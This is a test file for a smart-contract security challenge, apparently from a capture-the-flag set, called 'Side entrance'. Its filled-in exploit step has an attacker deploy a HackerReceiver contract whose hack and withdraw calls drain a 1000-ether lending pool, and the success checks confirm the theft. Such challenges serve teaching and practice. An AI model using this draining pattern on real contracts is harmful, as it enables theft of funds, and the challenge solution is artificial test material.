const { ether, balance } = require('@openzeppelin/test-helpers');
const { accounts, contract } = require('@openzeppelin/test-environment');

const SideEntranceLenderPool = contract.fromArtifact('SideEntranceLenderPool');
const HackerReceiver = contract.fromArtifact('HackerReceiver');

const { expect } = require('chai');

describe('[Challenge] Side entrance', function () {

    const [deployer, attacker, ...otherAccounts] = accounts;

    const ETHER_IN_POOL = ether('1000');

    before(async function () {
        /** SETUP SCENARIO */
        this.pool = await SideEntranceLenderPool.new({ from: deployer });
        
        await this.pool.deposit({ from: deployer, value: ETHER_IN_POOL });

        this.attackerInitialEthBalance = await balance.current(attacker);

        expect(
            await balance.current(this.pool.address)
        ).to.be.bignumber.equal(ETHER_IN_POOL);
    });

    it('Exploit', async function () {
        /** YOUR EXPLOIT GOES HERE */
        const receiver = await HackerReceiver.new(this.pool.address, {from: attacker})
        await receiver.hack(ETHER_IN_POOL, {from:attacker})
        await receiver.withdraw({from:attacker})
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await balance.current(this.pool.address)
        ).to.be.bignumber.equal('0');
        
        // Not checking exactly how much is the final balance of the attacker,
        // because it'll depend on how much gas the attacker spends in the attack
        // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
        expect(
            await balance.current(attacker)
        ).to.be.bignumber.gt(this.attackerInitialEthBalance);
    });
});
